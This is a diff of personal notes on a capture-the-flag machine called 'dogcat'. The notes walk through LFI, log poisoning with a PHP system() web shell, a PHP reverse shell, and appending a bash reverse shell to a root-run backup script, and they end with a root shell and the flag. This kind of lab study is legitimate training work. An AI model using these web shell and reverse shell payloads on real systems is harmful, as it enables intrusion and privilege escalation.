@@ -23,7 +23,10 @@ looking at script ,, php ,, you have to put &ext at the end of lfi
 
 log poisoning 
 
-intercept and add command script to logs, <?php system($_GET['c']); ?>
+intercept and add command script to logs, 
+```php
+<?php system($_GET['c']); ?>
+```
 
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
@@ -54,9 +57,11 @@ cd backups
 ls
 backup.sh
 backup.tar
+
 cat backup.sh
 #!/bin/bash
 tar cf /root/container/backup/backup.tar /root/container
+
 pwd
 /opt/backups
 ls
@@ -65,7 +70,7 @@ backup.tar
 echo 'bash -i >& /dev/tcp/10.6.65.43/7263 0>&1' >> backup.sh
 
 
-
+```bash
 ──(kali㉿kali)-[~]
 └─$ nc -lvnp 7263
 listening on [any] 7263 ...
@@ -80,7 +85,7 @@ root@dogcat:~# cat flag4.txt
 cat flag4.txt
 THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
 root@dogcat:~# 
-
+```
 
 
 
